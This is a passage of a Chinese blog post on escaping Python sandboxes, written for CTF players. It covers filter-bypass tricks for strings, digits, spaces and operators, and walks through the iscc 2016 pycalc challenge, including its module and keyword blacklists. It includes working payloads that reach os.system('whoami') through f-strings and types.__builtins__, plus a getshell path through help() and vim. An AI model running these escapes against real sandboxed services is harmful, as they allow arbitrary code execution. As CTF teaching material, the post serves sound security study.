+<p>如果 str 被过滤了怎么办呢？<code>type('')()</code>、<code>format()</code> 即可。同理，<code>int</code>、<code>list</code> 都可以用 <code>type</code> 构造出来。</p>
+<blockquote>
+<p>格式化字符串</p>
+</blockquote>
+<p>那过滤了引号，格式化字符串还能用吗？</p>
+<p><code>(chr(37)+str(&#123;&#125;.__class__)[1])%100 == 'd'</code></p>
+<p>又起飞了...</p>
+<blockquote>
+<p>dict() 拿键它不香吗？</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;whoami&#x27;</span> ==<br><span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(whoami=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>] ==<br><span class="hljs-built_in">str</span>(<span class="hljs-built_in">dict</span>(whoami=<span class="hljs-number">1</span>))[<span class="hljs-number">2</span>:<span class="hljs-number">8</span>] ==<br></code></pre></td></tr></table></figure>
+<h3 id="限制数字">限制数字</h3>
+<p>上面提到了字符串过滤绕过，顺便说一下，如果是过滤了数字（虽然这种情况很少见），那绕过的方式就更多了，我这里随便列下：</p>
+<ol type="1">
+<li>0：<code>int(bool([]))</code>、<code>Flase</code>、<code>len([])</code>、<code>any(())</code></li>
+<li>1：<code>int(bool([""]))</code>、<code>True</code>、<code>all(())</code>、<code>int(list(list(dict(a၁=())).pop()).pop())</code></li>
+<li>获取稍微大的数字：<code>len(str(&#123;&#125;.keys))</code>，不过需要慢慢找长度符合的字符串</li>
+<li>1.0：<code>float(True)</code></li>
+<li>-1：<code>~0</code></li>
+<li>...</li>
+</ol>
+<p>其实有了 <code>0</code> 就可以了，要啥整数直接做运算即可：<br />
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">0</span> ** <span class="hljs-number">0</span> == <span class="hljs-number">1</span><br><span class="hljs-number">1</span> + <span class="hljs-number">1</span> == <span class="hljs-number">2</span><br><span class="hljs-number">2</span> + <span class="hljs-number">1</span> == <span class="hljs-number">3</span><br><span class="hljs-number">2</span> ** <span class="hljs-number">2</span> == <span class="hljs-number">4</span><br>...<br></code></pre></td></tr></table></figure></p>
+<p>任意浮点数稍微麻烦点，需要想办法运算，但是一定可以搞出来，除非是 π 这种玩意...</p>
+<h3 id="限制空格">限制空格</h3>
+<p>空格通常来说可以通过 <code>()</code>、<code>[]</code> 替换掉。例如：</p>
+<p><code>[i for i in range(10) if i == 5]</code> 可以替换为 <code>[[i][0]for(i)in(range(10))if(i)==5]</code></p>
+<h3 id="限制运算符">限制运算符</h3>
+<p><code>&gt; &lt; ! - +</code> 这几个比较简单就不说了。</p>
+<p><code>==</code> 可以用 <code>in</code> 来替换。</p>
+<p>替换 <code>or</code> 的测试代码<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [(<span class="hljs-number">100</span>, <span class="hljs-number">100</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>), (<span class="hljs-number">100</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>), (<span class="hljs-number">100</span>, <span class="hljs-number">100</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>), (<span class="hljs-number">100</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)]:<br>    ans = i[<span class="hljs-number">0</span>]==i[<span class="hljs-number">1</span>] <span class="hljs-keyword">or</span> i[<span class="hljs-number">2</span>]==i[<span class="hljs-number">3</span>]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">bool</span>(<span class="hljs-built_in">eval</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i[<span class="hljs-number">0</span>]==i[<span class="hljs-number">1</span>]&#125;</span> | <span class="hljs-subst">&#123;i[<span class="hljs-number">2</span>]==i[<span class="hljs-number">3</span>]&#125;</span>&#x27;</span>)) == ans)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">bool</span>(<span class="hljs-built_in">eval</span>(<span class="hljs-string">f&#x27;- <span class="hljs-subst">&#123;i[<span class="hljs-number">0</span>]==i[<span class="hljs-number">1</span>]&#125;</span> - <span class="hljs-subst">&#123;i[<span class="hljs-number">2</span>]==i[<span class="hljs-number">3</span>]&#125;</span>&#x27;</span>)) == ans)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">bool</span>(<span class="hljs-built_in">eval</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i[<span class="hljs-number">0</span>]==i[<span class="hljs-number">1</span>]&#125;</span> + <span class="hljs-subst">&#123;i[<span class="hljs-number">2</span>]==i[<span class="hljs-number">3</span>]&#125;</span>&#x27;</span>)) == ans)<br></code></pre></td></tr></table></figure><br />
+上面这几个表达式都可以替换掉 <code>or</code></p>
+<p>替换 <code>and</code> 的测试代码<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [(<span class="hljs-number">100</span>, <span class="hljs-number">100</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>), (<span class="hljs-number">100</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>), (<span class="hljs-number">100</span>, <span class="hljs-number">100</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>), (<span class="hljs-number">100</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)]:<br>    ans = i[<span class="hljs-number">0</span>]==i[<span class="hljs-number">1</span>] <span class="hljs-keyword">and</span> i[<span class="hljs-number">2</span>]==i[<span class="hljs-number">3</span>]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">bool</span>(<span class="hljs-built_in">eval</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i[<span class="hljs-number">0</span>]==i[<span class="hljs-number">1</span>]&#125;</span> &amp; <span class="hljs-subst">&#123;i[<span class="hljs-number">2</span>]==i[<span class="hljs-number">3</span>]&#125;</span>&#x27;</span>)) == ans)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">bool</span>(<span class="hljs-built_in">eval</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i[<span class="hljs-number">0</span>]==i[<span class="hljs-number">1</span>]&#125;</span> * <span class="hljs-subst">&#123;i[<span class="hljs-number">2</span>]==i[<span class="hljs-number">3</span>]&#125;</span>&#x27;</span>)) == ans)<br></code></pre></td></tr></table></figure><br />
+上面这几个表达式都可以替换掉 <code>and</code></p>
+<h3 id="限制">限制 ( )</h3>
+<p>这种情况下通常需要能够支持 exec 执行代码。因为有两种姿势：</p>
+<ul>
+<li>利用装饰器 <code>@</code></li>
+<li>利用魔术方法，例如 <code>enum.EnumMeta.__getitem__</code>，</li>
+</ul>
+<p>利用这两种姿势，我在《OrangeKiller CTF 第 2 期》中出了 2 道题目，题解篇写的很详细，移步去看吧：<a href="https://www.tr0y.wang/2022/06/27/OrangeKiller_CTF_2_wp/">传送门</a></p>
+<h3 id="利用新特性">利用新特性</h3>
+<p>PEP 498 引入了 <code>f-string</code>，在 3.6 开始出现：<a target="_blank" rel="noopener" href="https://docs.python.org/3.6/whatsnew/3.6.html#new-features">传送门🚪</a>，食用方式：<a target="_blank" rel="noopener" href="https://docs.python.org/3.6/reference/lexical_analysis.html#f-strings">传送门🚪</a>。所以我们就有了一种船新的利用方式：<br />
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).system(<span class="hljs-string">&quot;whoami&quot;</span>)&#125;</span>&#x27;</span><br>macr0phag3<br><span class="hljs-string">&#x27;0&#x27;</span><br></code></pre></td></tr></table></figure><br />
+关注每次版本增加的新特性，或许能淘到点宝贝。</p>
+<h3 id="利用反序列化攻击">利用反序列化攻击</h3>
+<p>反序列化攻击也是能用来逃逸，但是关于反序列化攻击的安全问题还挺多的，我专门写了篇文章，见：<a href="https://www.tr0y.wang/2022/02/03/SecMap-unserialize-python/">传送门🚪</a></p>
+<h2 id="section">🌰</h2>
+<p>这个例子来自<code>iscc 2016</code>的<code>Pwn300 pycalc</code>，相当有趣：<br />
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">banner</span>():<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;=============================================&quot;</span><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;   Simple calculator implemented by python   &quot;</span><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;=============================================&quot;</span><br>    <span class="hljs-keyword">return</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getexp</span>():<br>    <span class="hljs-keyword">return</span> raw_input(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_hook_import_</span>(<span class="hljs-params">name, *args, **kwargs</span>):<br>    module_blacklist = [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;time&#x27;</span>, <span class="hljs-string">&#x27;bdb&#x27;</span>, <span class="hljs-string">&#x27;bsddb&#x27;</span>, <span class="hljs-string">&#x27;cgi&#x27;</span>,<br>                        <span class="hljs-string">&#x27;CGIHTTPServer&#x27;</span>, <span class="hljs-string">&#x27;cgitb&#x27;</span>, <span class="hljs-string">&#x27;compileall&#x27;</span>, <span class="hljs-string">&#x27;ctypes&#x27;</span>, <span class="hljs-string">&#x27;dircache&#x27;</span>,<br>                        <span class="hljs-string">&#x27;doctest&#x27;</span>, <span class="hljs-string">&#x27;dumbdbm&#x27;</span>, <span class="hljs-string">&#x27;filecmp&#x27;</span>, <span class="hljs-string">&#x27;fileinput&#x27;</span>, <span class="hljs-string">&#x27;ftplib&#x27;</span>, <span class="hljs-string">&#x27;gzip&#x27;</span>,<br>                        <span class="hljs-string">&#x27;getopt&#x27;</span>, <span class="hljs-string">&#x27;getpass&#x27;</span>, <span class="hljs-string">&#x27;gettext&#x27;</span>, <span class="hljs-string">&#x27;httplib&#x27;</span>, <span class="hljs-string">&#x27;importlib&#x27;</span>, <span class="hljs-string">&#x27;imputil&#x27;</span>,<br>                        <span class="hljs-string">&#x27;linecache&#x27;</span>, <span class="hljs-string">&#x27;macpath&#x27;</span>, <span class="hljs-string">&#x27;mailbox&#x27;</span>, <span class="hljs-string">&#x27;mailcap&#x27;</span>, <span class="hljs-string">&#x27;mhlib&#x27;</span>, <span class="hljs-string">&#x27;mimetools&#x27;</span>,<br>                        <span class="hljs-string">&#x27;mimetypes&#x27;</span>, <span class="hljs-string">&#x27;modulefinder&#x27;</span>, <span class="hljs-string">&#x27;multiprocessing&#x27;</span>, <span class="hljs-string">&#x27;netrc&#x27;</span>, <span class="hljs-string">&#x27;new&#x27;</span>,<br>                        <span class="hljs-string">&#x27;optparse&#x27;</span>, <span class="hljs-string">&#x27;pdb&#x27;</span>, <span class="hljs-string">&#x27;pipes&#x27;</span>, <span class="hljs-string">&#x27;pkgutil&#x27;</span>, <span class="hljs-string">&#x27;platform&#x27;</span>, <span class="hljs-string">&#x27;popen2&#x27;</span>, <span class="hljs-string">&#x27;poplib&#x27;</span>,<br>                        <span class="hljs-string">&#x27;posix&#x27;</span>, <span class="hljs-string">&#x27;posixfile&#x27;</span>, <span class="hljs-string">&#x27;profile&#x27;</span>, <span class="hljs-string">&#x27;pstats&#x27;</span>, <span class="hljs-string">&#x27;pty&#x27;</span>, <span class="hljs-string">&#x27;py_compile&#x27;</span>,<br>                        <span class="hljs-string">&#x27;pyclbr&#x27;</span>, <span class="hljs-string">&#x27;pydoc&#x27;</span>, <span class="hljs-string">&#x27;rexec&#x27;</span>, <span class="hljs-string">&#x27;runpy&#x27;</span>, <span class="hljs-string">&#x27;shlex&#x27;</span>, <span class="hljs-string">&#x27;shutil&#x27;</span>, <span class="hljs-string">&#x27;SimpleHTTPServer&#x27;</span>,<br>                        <span class="hljs-string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="hljs-string">&#x27;site&#x27;</span>, <span class="hljs-string">&#x27;smtpd&#x27;</span>, <span class="hljs-string">&#x27;socket&#x27;</span>, <span class="hljs-string">&#x27;SocketServer&#x27;</span>,<br>                        <span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;sysconfig&#x27;</span>, <span class="hljs-string">&#x27;tabnanny&#x27;</span>, <span class="hljs-string">&#x27;tarfile&#x27;</span>, <span class="hljs-string">&#x27;telnetlib&#x27;</span>,<br>                        <span class="hljs-string">&#x27;tempfile&#x27;</span>, <span class="hljs-string">&#x27;Tix&#x27;</span>, <span class="hljs-string">&#x27;trace&#x27;</span>, <span class="hljs-string">&#x27;turtle&#x27;</span>, <span class="hljs-string">&#x27;urllib&#x27;</span>, <span class="hljs-string">&#x27;urllib2&#x27;</span>,<br>                        <span class="hljs-string">&#x27;user&#x27;</span>, <span class="hljs-string">&#x27;uu&#x27;</span>, <span class="hljs-string">&#x27;webbrowser&#x27;</span>, <span class="hljs-string">&#x27;whichdb&#x27;</span>, <span class="hljs-string">&#x27;zipfile&#x27;</span>, <span class="hljs-string">&#x27;zipimport&#x27;</span>]<br>    <span class="hljs-keyword">for</span> forbid <span class="hljs-keyword">in</span> module_blacklist:<br>        <span class="hljs-keyword">if</span> name == forbid:        <span class="hljs-comment"># don&#x27;t let user import these modules</span><br>            <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">&#x27;No you can\&#x27; import &#123;0&#125;!!!&#x27;</span>.<span class="hljs-built_in">format</span>(forbid))<br>    <span class="hljs-comment"># normal modules can be imported</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">__import__</span>(name, *args, **kwargs)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sandbox_filter</span>(<span class="hljs-params">command</span>):<br>    blacklist = [<span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;__getitem__&#x27;</span>, <span class="hljs-string">&#x27;__setitem__&#x27;</span>,<br>                 <span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;read&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>]<br>    <span class="hljs-keyword">for</span> forbid <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> forbid <span class="hljs-keyword">in</span> command:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sandbox_exec</span>(<span class="hljs-params">command</span>):      <span class="hljs-comment"># sandbox user input</span><br>    result = <span class="hljs-number">0</span><br>    __sandboxed_builtins__ = <span class="hljs-built_in">dict</span>(__builtins__.__dict__)<br>    __sandboxed_builtins__[<span class="hljs-string">&#x27;__import__&#x27;</span>] = _hook_import_    <span class="hljs-comment"># hook import</span><br>    <span class="hljs-keyword">del</span> __sandboxed_builtins__[<span class="hljs-string">&#x27;open&#x27;</span>]<br>    _<span class="hljs-keyword">global</span> = &#123;<br>        <span class="hljs-string">&#x27;__builtins__&#x27;</span>: __sandboxed_builtins__<br>    &#125;<br>    <span class="hljs-keyword">if</span> sandbox_filter(command) == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Malicious user input detected!!!&#x27;</span><br>        exit(<span class="hljs-number">0</span>)<br>    command = <span class="hljs-string">&#x27;result = &#x27;</span> + command<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">exec</span> command <span class="hljs-keyword">in</span> _<span class="hljs-keyword">global</span>     <span class="hljs-comment"># do calculate in a sandboxed environment</span><br>    <span class="hljs-keyword">except</span> Exception, e:<br>        <span class="hljs-built_in">print</span> e<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    result = _<span class="hljs-keyword">global</span>[<span class="hljs-string">&#x27;result&#x27;</span>]  <span class="hljs-comment"># extract the result</span><br>    <span class="hljs-keyword">return</span> result<br><br><br>banner()<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    command = getexp()<br>    <span class="hljs-built_in">print</span> sandbox_exec(command)<br></code></pre></td></tr></table></figure></p>
+<p><code>exec command in _global</code> 这一句就把很多 payload 干掉了，由于 exec 运行在自定义的全局命名空间里，这时候会处于<code>restricted execution mode</code>，这里不赘述了，感兴趣可以看这篇文章：<a target="_blank" rel="noopener" href="http://tav.espians.com/paving-the-way-to-securing-the-python-interpreter.html">传送门🚪</a>。exec 加上定制的 globals 会使得沙箱安全很多，一些常规的 payload 是没法使用的，例如：<br />
+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs delphi">&gt;&gt;&gt; <span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">71</span>]._Printer__setup.__globals__<br>restricted attribute<br>&gt;&gt;&gt; getattr(getattr(__import__(<span class="hljs-string">&#x27;types&#x27;</span>), <span class="hljs-string">&#x27;FileType&#x27;</span>)(<span class="hljs-string">&#x27;key&#x27;</span>), <span class="hljs-string">&#x27;re&#x27;&#x27;ad&#x27;</span>)()<br><span class="hljs-keyword">file</span>() <span class="hljs-function"><span class="hljs-keyword">constructor</span> <span class="hljs-title">not</span> <span class="hljs-title">accessible</span> <span class="hljs-title">in</span> <span class="hljs-title">restricted</span> <span class="hljs-title">mode</span></span><br></code></pre></td></tr></table></figure><br />
+不过也正是由于 exec 运行在特定的命名空间里，可以通过其他命名空间里的 <code>__builtins__</code>，比如 types 库，来执行任意命令：<br />
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">&gt;&gt;&gt; getattr(<span class="hljs-name">__import__</span>(&#x27;types&#x27;).__builtins__[&#x27;__tropmi__&#x27;[:<span class="hljs-symbol">:-1</span>]](&#x27;so&#x27;[:<span class="hljs-symbol">:-1</span>]), &#x27;mets&#x27; &#x27;ys&#x27;[:<span class="hljs-symbol">:-1</span>])(&#x27;whoami&#x27;)<br>macr0phag3<br></code></pre></td></tr></table></figure></p>
+<h3 id="极端限制">极端限制</h3>
+<p>这种限制一般是组合形式出现，而且通常只会出现在 CTF 中。</p>
+<blockquote>
+<p>限制输入字符的集合的大小</p>
+</blockquote>
+<p>思路就是先确定不得不用到的字符，再看这些字符能够拼出哪些函数或者常量。</p>
+<p>我在《OrangeKiller CTF 第 2 期》中出了 3 道题目与此相关，题解篇写的很详细，移步去看吧：<a href="https://www.tr0y.wang/2022/06/27/OrangeKiller_CTF_2_wp/">传送门</a></p>
+<blockquote>
+<p>限制不能使用 <code>[a-zA-Z]</code> 的字符</p>
+</blockquote>
+<p>我在 <a href="https://www.tr0y.wang/2020/08/18/IDN/#利用场景">《从一个绕过长度限制的 XSS 中，我们能学到什么？》</a> 中提到过，Python3 支持了 Unicode 变量名且解释器在做代码解析的时候，会对变量名进行规范化，算法是 <code>NFKC</code>。</p>
+<p>所以在这种情况下可以用这种姿势：<br />
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">eval</span> == ᵉval<br></code></pre></td></tr></table></figure></p>
+<blockquote>
+<p>socket + 严格的输入限制</p>
+</blockquote>
+<p>可以看看是否漏掉了 <code>help</code>，漏掉的话，先通过 <code>help()</code> 调起 vi/vim，然后用 <code>!</code> 指令即可 getshell :)</p>
+<blockquote>
+<p>通解</p>
+</blockquote>
+<p>已经专门写文章介绍了，见：<a href="https://www.tr0y.wang/2022/09/28/common-exp-of-python-jail/">《Python 沙箱逃逸的通解探索之路》</a></p>
+<h2 id="最后">最后</h2>
+<p>这块内容本身就零散，罗里吧嗦了这么多，希望对大家有帮助，如果有不严谨的地方希望各位师傅们能指出来，共同探讨 [抱拳]</p>
+<br>
+<p style="text-align: center;">
+<font size="2px" color="gray">来呀快活呀</font><br />
+<img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload style="zoom:30%" />
+</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="category-chain-item">经验总结</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Python/">#Python</a>
+      
+        <a href="/tags/Web/">#Web</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Python 沙箱逃逸的经验总结</div>
+      <div>https://www.tr0y.wang/2019/05/06/Python沙箱逃逸经验总结/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Tr0y</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2019年5月6日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2023年12月13日</div>
+        </div>
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/05/11/OWASP-Top10-%E7%B3%BB%E5%88%97%E4%B9%8BXPath%E6%B3%A8%E5%85%A5/" title="OWASP Top10 系列之 XPath 注入">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">OWASP Top10 系列之 XPath 注入</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/05/03/XXE%E6%8C%87%E5%8C%97/" title="XXE 指北">
+                        <span class="hidden-mobile">XXE 指北</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'Macr0phag3/Macr0phag3.github.io');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('label', 'comment');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":true,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
